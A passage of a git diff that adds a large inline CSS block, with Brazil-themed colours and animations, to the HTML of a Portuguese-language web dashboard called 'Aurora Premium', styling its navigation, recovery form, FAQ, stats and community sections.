@@ -2,72 +2,2977 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Aurora | Dashboard</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Aurora Premium | Dashboard Avançada</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Poppins:wght@600;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        /* ===== TODOS OS ESTILOS EXISTENTES ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #009739;
+            --primary-dark: #00802e;
+            --primary-light: #00b84a;
+            --secondary: #fedc00;
+            --secondary-dark: #f5c800;
+            --accent: #ec4899;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --dark: #0f172a;
+            --darker: #020617;
+            --light: #f8fafc;
+            --border: #e2e8f0;
+            --text: #1e293b;
+            --text-light: #64748b;
+            --nav-height: 70px;
+            --gold: #ffd700;
+            --brazil-green: #009739;
+            --brazil-yellow: #fedc00;
+            --brazil-blue: #012169;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0a1a0a 0%, #1a2a1a 50%, #0a1a0a 100%);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* ===== FUNDO ANIMADO BRASIL ===== */
+        .animated-bg {
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .stars {
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            background-image:
+                radial-gradient(2px 2px at 20% 30%, #ffd700, transparent),
+                radial-gradient(2px 2px at 40% 70%, #ffd700, transparent),
+                radial-gradient(2px 2px at 60% 20%, #ffd700, transparent),
+                radial-gradient(2px 2px at 80% 80%, #ffd700, transparent),
+                radial-gradient(1px 1px at 10% 50%, #ffd700, transparent),
+                radial-gradient(1px 1px at 90% 40%, #ffd700, transparent);
+            background-size: 200px 200px;
+            animation: twinkle 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes twinkle {
+            0% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+
+        .glow-orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(100px);
+            opacity: 0.2;
+            animation: floatGlow 12s ease-in-out infinite alternate;
+        }
+
+        .glow-1 {
+            width: 500px;
+            height: 500px;
+            background: var(--brazil-green);
+            top: -15%;
+            left: -10%;
+        }
+
+        .glow-2 {
+            width: 400px;
+            height: 400px;
+            background: var(--brazil-yellow);
+            bottom: -15%;
+            right: -10%;
+            animation-delay: -4s;
+        }
+
+        .glow-3 {
+            width: 300px;
+            height: 300px;
+            background: var(--brazil-blue);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation-delay: -8s;
+            opacity: 0.1;
+        }
+
+        @keyframes floatGlow {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(40px, -40px) scale(1.2); }
+        }
+
+        /* ===== ANIMAÇÕES ===== */
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideInRight {
+            from { opacity: 0; transform: translateX(60px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes slideInLeft {
+            from { opacity: 0; transform: translateX(-60px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        @keyframes scaleIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-20px); }
+        }
+
+        @keyframes floatRotate {
+            0% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(180deg); }
+            100% { transform: translateY(0) rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        @keyframes bounceIn {
+            0% { opacity: 0; transform: scale(0.3); }
+            50% { opacity: 1; transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes progressFill {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        /* ===== SCROLLBAR ===== */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--dark); }
+        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--primary-light); }
+
+        /* ===== NAVBAR ===== */
+        .navbar {
+            background: rgba(10, 26, 10, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-bottom: 2px solid rgba(254, 220, 0, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            padding: 0.8rem 0;
+            animation: slideDown 0.6s ease-out;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            transition: background 0.3s ease;
+            height: var(--nav-height);
+            display: flex;
+            align-items: center;
+        }
+
+        .nav-container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 1.3rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #009739, #fedc00, #012169);
+            background-size: 200% 200%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .nav-logo i {
+            font-size: 1.5rem;
+            color: #fedc00;
+            -webkit-text-fill-color: initial;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 0.5rem;
+            align-items: center;
+        }
+
+        .nav-link {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.8rem;
+            transition: all 0.3s ease;
+            position: relative;
+            padding: 0.4rem 0.7rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+            border-radius: 8px;
+            white-space: nowrap;
+        }
+
+        .nav-link::before {
+            content: '';
+            position: absolute;
+            bottom: 2px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 2px;
+            background: linear-gradient(90deg, #009739, #fedc00);
+            transition: width 0.3s ease;
+        }
+
+        .nav-link:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .nav-link:hover::before {
+            width: 60%;
+        }
+
+        .nav-link.active {
+            color: #fedc00;
+            background: rgba(254, 220, 0, 0.1);
+        }
+
+        .nav-link.active::before {
+            width: 60%;
+            background: #fedc00;
+        }
+
+        .nav-link i {
+            font-size: 0.8rem;
+        }
+
+        .nav-toggle {
+            display: none;
+            cursor: pointer;
+            color: white;
+            font-size: 1.5rem;
+            padding: 0.3rem;
+            background: none;
+            border: none;
+            z-index: 1001;
+        }
+
+        /* ===== CONTAINER ===== */
+        .container {
+            max-width: 1600px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ===== SEÇÕES ===== */
+        .section {
+            display: none;
+            min-height: 80vh;
+            padding: 2rem 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .section.active {
+            display: block;
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        /* ===== HOME SECTION ===== */
+        .hero-content {
+            text-align: center;
+            max-width: 900px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 70vh;
+            padding: 1rem 0;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(254, 220, 0, 0.4);
+            color: #fedc00;
+            padding: 0.5rem 1.2rem;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            margin-bottom: 1.5rem;
+            animation: fadeInUp 0.6s ease-out;
+            backdrop-filter: blur(10px);
+        }
+
+        .hero-title {
+            font-family: 'Poppins', sans-serif;
+            font-size: clamp(2rem, 6vw, 4.5rem);
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #fedc00 0%, #009739 40%, #012169 70%, #ffd700 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInUp 0.8s ease-out 0.1s both;
+        }
+
+        .hero-subtitle {
+            font-size: clamp(0.9rem, 2.5vw, 1.3rem);
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 1rem;
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+        }
+
+        .hero-subtitle .hexa {
+            color: #fedc00;
+            font-weight: 900;
+            text-shadow: 0 0 20px rgba(254, 220, 0, 0.3);
+        }
+
+        .hero-description {
+            font-size: clamp(0.9rem, 1.8vw, 1.1rem);
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 2rem;
+            max-width: 700px;
+            line-height: 1.7;
+            animation: fadeInUp 0.8s ease-out 0.3s both;
+            padding: 0 1rem;
+        }
+
+        .hero-features {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin-bottom: 2.5rem;
+            flex-wrap: wrap;
+            animation: fadeInUp 0.8s ease-out 0.4s both;
+        }
+
+        .feature-badge {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: rgba(255, 255, 255, 0.8);
+            font-weight: 600;
+            font-size: 0.85rem;
+            background: rgba(254, 220, 0, 0.1);
+            padding: 0.5rem 1.2rem;
+            border-radius: 8px;
+            border: 1px solid rgba(254, 220, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .feature-badge:hover {
+            background: rgba(254, 220, 0, 0.2);
+            border-color: rgba(254, 220, 0, 0.4);
+            transform: translateY(-3px);
+        }
+
+        .feature-badge i {
+            color: #fedc00;
+            font-size: 1rem;
+        }
+
+        .btn {
+            padding: 0.9rem 2rem;
+            border: none;
+            border-radius: 10px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            font-size: 0.95rem;
+            position: relative;
+            overflow: hidden;
+            font-family: 'Inter', sans-serif;
+            touch-action: manipulation;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            transition: left 0.3s ease;
+            z-index: -1;
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #009739, #00802e);
+            color: white;
+            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            border: 1px solid rgba(254, 220, 0, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(0, 151, 57, 0.5);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0px);
+        }
+
+        .btn-lg {
+            padding: 1rem 2.5rem;
+            font-size: 1rem;
+        }
+
+        .hero-cta {
+            animation: fadeInUp 0.8s ease-out 0.5s both;
+        }
+
+        /* ===== CARDS SECTION ===== */
+        .cards-section {
+            padding: 4rem 0;
+        }
+
+        .section-title {
+            font-family: 'Poppins', sans-serif;
+            font-size: clamp(1.8rem, 4vw, 3rem);
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 0.8rem;
+            background: linear-gradient(135deg, #fedc00 0%, #009739 40%, #012169 70%, #ffd700 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 2.5rem;
+            font-size: clamp(0.9rem, 1.5vw, 1.1rem);
+            animation: fadeInUp 0.6s ease-out 0.1s both;
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 3rem;
+        }
+
+        .card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 16px;
+            padding: 2rem;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 151, 57, 0.1) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+
+        .card:hover::before {
+            opacity: 1;
+        }
+
+        .card:nth-child(1) { animation-delay: 0.1s; }
+        .card:nth-child(2) { animation-delay: 0.2s; }
+        .card:nth-child(3) { animation-delay: 0.3s; }
+        .card:nth-child(4) { animation-delay: 0.4s; }
+
+        .card:hover {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
+            border-color: rgba(254, 220, 0, 0.4);
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0, 151, 57, 0.25);
+        }
+
+        .card-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #009739, #00802e);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.7rem;
+            color: white;
+            margin-bottom: 1.2rem;
+            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .card:hover .card-icon {
+            transform: scale(1.1) rotate(10deg);
+        }
+
+        .card-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            margin-bottom: 0.8rem;
+            color: white;
+        }
+
+        .card-text {
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.6;
+            font-size: 0.9rem;
+        }
+
+        /* ===== RECOVERY SECTION ===== */
+        .recovery-grid {
+            display: grid;
+            grid-template-columns: 1fr 320px;
+            gap: 2rem;
+            align-items: start;
+            margin-top: 2rem;
+        }
+
+        .main-card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 20px;
+            padding: 2rem;
+            animation: slideInLeft 0.8s ease-out;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid rgba(254, 220, 0, 0.1);
+            flex-wrap: wrap;
+            gap: 0.8rem;
+        }
+
+        .card-header h1 {
+            font-size: clamp(1.3rem, 2.5vw, 1.8rem);
+            font-weight: 800;
+            color: white;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .badge {
+            background: linear-gradient(135deg, #009739, #fedc00);
+            color: #012169;
+            padding: 0.4rem 1.2rem;
+            border-radius: 50px;
+            font-size: 0.75rem;
+            font-weight: 900;
+            box-shadow: 0 10px 25px rgba(0, 151, 57, 0.3);
+            animation: bounceIn 0.6s ease-out;
+            white-space: nowrap;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 0.8rem;
+            font-size: 0.9rem;
+        }
+
+        .form-label i {
+            color: #fedc00;
+            font-size: 1rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 0.9rem 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1.5px solid rgba(254, 220, 0, 0.2);
+            border-radius: 12px;
+            color: white;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+            font-weight: 500;
+            font-family: 'Inter', sans-serif;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .form-input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(0, 151, 57, 0.6);
+            box-shadow: 0 0 0 4px rgba(0, 151, 57, 0.15);
+        }
+
+        .form-input::placeholder {
+            color: rgba(255, 255, 255, 0.35);
+        }
+
+        .toggle-btn {
+            position: absolute;
+            right: 1rem;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.5);
+            cursor: pointer;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            padding: 0.3rem;
+        }
+
+        .toggle-btn:hover {
+            color: #fedc00;
+        }
+
+        .form-hint {
+            display: block;
+            font-size: 0.75rem;
+            color: rgba(255, 255, 255, 0.5);
+            margin-top: 0.5rem;
+            font-weight: 500;
+        }
+
+        .security-box {
+            background: linear-gradient(135deg, rgba(0, 151, 57, 0.15), rgba(0, 151, 57, 0.05));
+            border: 1.5px solid rgba(0, 151, 57, 0.3);
+            border-radius: 12px;
+            padding: 1.2rem;
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+            animation: slideInRight 0.8s ease-out 0.2s both;
+        }
+
+        .security-box i {
+            color: #00b84a;
+            font-size: 1.3rem;
+            flex-shrink: 0;
+            margin-top: 0.2rem;
+        }
+
+        .security-box p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            line-height: 1.6;
+        }
+
+        .security-box strong {
+            color: #fedc00;
+        }
+
+        .btn-block {
+            width: 100%;
+        }
+
+        .disclaimer {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.75rem;
+            line-height: 1.6;
+            margin-top: 1.2rem;
+        }
+
+        .disclaimer a {
+            color: #fedc00;
+            text-decoration: none;
+            font-weight: 700;
+            transition: color 0.3s ease;
+        }
+
+        .disclaimer a:hover {
+            color: #ffd700;
+        }
+
+        /* ===== BLOQUEIO MESSAGE ===== */
+        .block-message {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(239, 68, 68, 0.05));
+            border: 2px solid rgba(239, 68, 68, 0.3);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
+            margin-top: 1rem;
+            display: none;
+        }
+
+        .block-message.visible {
+            display: block;
+            animation: fadeInUp 0.4s ease-out;
+        }
+
+        .block-message i {
+            color: #ef4444;
+            font-size: 2rem;
+            display: block;
+            margin-bottom: 0.5rem;
+        }
+
+        .block-message h3 {
+            color: #ef4444;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .block-message p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+        }
+
+        .block-message .timer {
+            font-size: 2rem;
+            font-weight: 900;
+            color: #fedc00;
+            margin: 0.5rem 0;
+        }
+
+        /* ===== SIDEBAR ===== */
+        .sidebar {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+        }
+
+        .info-card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 16px;
+            padding: 1.5rem;
+            animation: slideInRight 0.8s ease-out;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+        }
+
+        .info-card h4 {
+            color: white;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .info-card h4 i {
+            color: #fedc00;
+        }
+
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.6rem 0;
+            border-bottom: 1px solid rgba(254, 220, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        .info-item:last-child {
+            border-bottom: none;
+        }
+
+        .info-item:hover {
+            padding-left: 0.3rem;
+        }
+
+        .info-label {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        .info-value {
+            color: #fedc00;
+            font-weight: 800;
+            font-size: 1rem;
+        }
+
+        .features-list {
+            list-style: none;
+        }
+
+        .features-list li {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: rgba(255, 255, 255, 0.6);
+            padding: 0.5rem 0;
+            font-size: 0.8rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .features-list li:hover {
+            color: white;
+            padding-left: 0.3rem;
+        }
+
+        .features-list i {
+            color: #00b84a;
+            font-weight: 700;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: #00b84a;
+            background: rgba(0, 151, 57, 0.1);
+            padding: 0.3rem 0.8rem;
+            border-radius: 50px;
+            width: fit-content;
+        }
+
+        .status-indicator i {
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        /* ===== FAQ SECTION ===== */
+        .faq-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .faq-item {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 14px;
+            overflow: hidden;
+            transition: all 0.4s ease;
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+        }
+
+        .faq-item:nth-child(1) { animation-delay: 0.1s; }
+        .faq-item:nth-child(2) { animation-delay: 0.2s; }
+        .faq-item:nth-child(3) { animation-delay: 0.3s; }
+        .faq-item:nth-child(4) { animation-delay: 0.4s; }
+        .faq-item:nth-child(5) { animation-delay: 0.5s; }
+        .faq-item:nth-child(6) { animation-delay: 0.6s; }
+
+        .faq-item:hover {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
+            border-color: rgba(0, 151, 57, 0.3);
+            transform: translateY(-5px);
+        }
+
+        .faq-question {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 1.5rem;
+            cursor: pointer;
+            user-select: none;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .faq-question:hover {
+            background: rgba(0, 151, 57, 0.05);
+        }
+
+        .faq-question h3 {
+            color: white;
+            font-size: 0.95rem;
+            font-weight: 700;
+            margin: 0;
+        }
+
+        .faq-question i {
+            color: #fedc00;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            font-size: 1rem;
+            flex-shrink: 0;
+            margin-left: 0.5rem;
+        }
+
+        .faq-item.active .faq-question i {
+            transform: rotate(180deg);
+            color: #009739;
+        }
+
+        .faq-answer {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        .faq-item.active .faq-answer {
+            max-height: 300px;
+        }
+
+        .faq-answer p {
+            padding: 0 1.5rem 1.5rem;
+            color: rgba(255, 255, 255, 0.6);
+            line-height: 1.7;
+            font-size: 0.85rem;
+        }
+
+        /* ===== STATS SECTION ===== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .stat-box {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 16px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-box::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(254, 220, 0, 0.1) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+
+        .stat-box:hover::before {
+            opacity: 1;
+        }
+
+        .stat-box:nth-child(1) { animation-delay: 0.1s; }
+        .stat-box:nth-child(2) { animation-delay: 0.2s; }
+        .stat-box:nth-child(3) { animation-delay: 0.3s; }
+
+        .stat-box:hover {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
+            border-color: rgba(254, 220, 0, 0.4);
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(254, 220, 0, 0.25);
+        }
+
+        .stat-number {
+            display: block;
+            font-size: clamp(1.8rem, 4vw, 2.8rem);
+            font-weight: 900;
+            background: linear-gradient(135deg, #fedc00, #009739);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+            animation: fadeInUp 0.8s ease-out;
+        }
+
+        .stat-desc {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+            font-weight: 600;
+        }
+
+        /* ===== COMUNIDADE SECTION ===== */
+        .comunidade-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .comunidade-card {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.08), rgba(255, 255, 255, 0.02));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(254, 220, 0, 0.15);
+            border-radius: 16px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .comunidade-card:nth-child(1) { animation-delay: 0.1s; }
+        .comunidade-card:nth-child(2) { animation-delay: 0.2s; }
+        .comunidade-card:nth-child(3) { animation-delay: 0.3s; }
+
+        .comunidade-card:hover {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.12), rgba(255, 255, 255, 0.05));
+            border-color: rgba(0, 151, 57, 0.4);
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0, 151, 57, 0.25);
+        }
+
+        .comunidade-icon {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            margin: 0 auto 1.2rem;
+            transition: all 0.3s ease;
+        }
+
+        .comunidade-card:hover .comunidade-icon {
+            transform: scale(1.1) rotate(10deg);
+        }
+
+        .comunidade-icon.discord { background: linear-gradient(135deg, #5865F2, #4752C4); color: white; }
+        .comunidade-icon.email { background: linear-gradient(135deg, #ea4335, #c5221f); color: white; }
+        .comunidade-icon.tiktok { background: linear-gradient(135deg, #000000, #1a1a1a); color: #25f4ee; border: 2px solid #25f4ee; }
+
+        .comunidade-card h3 {
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .comunidade-card p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            margin-bottom: 1.2rem;
+            line-height: 1.6;
+        }
+
+        .comunidade-card .btn-comunidade {
+            background: rgba(255, 255, 255, 0.05);
+            color: rgba(255, 255, 255, 0.8);
+            border: 1.5px solid rgba(254, 220, 0, 0.1);
+            border-radius: 10px;
+            padding: 0.7rem 1.5rem;
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .comunidade-card:hover .btn-comunidade {
+            background: rgba(0, 151, 57, 0.15);
+            border-color: rgba(0, 151, 57, 0.4);
+            color: #fedc00;
+        }
+
+        .email-info {
+            margin-top: 1rem;
+            padding: 0.8rem;
+            background: rgba(0, 151, 57, 0.1);
+            border-radius: 10px;
+            border: 1px solid rgba(0, 151, 57, 0.2);
+        }
+
+        .email-info p {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .email-info i {
+            color: #fedc00;
+        }
+
+        /* ===== TERMS & PRIVACY MODAL ===== */
+        .terms-modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            display: none;
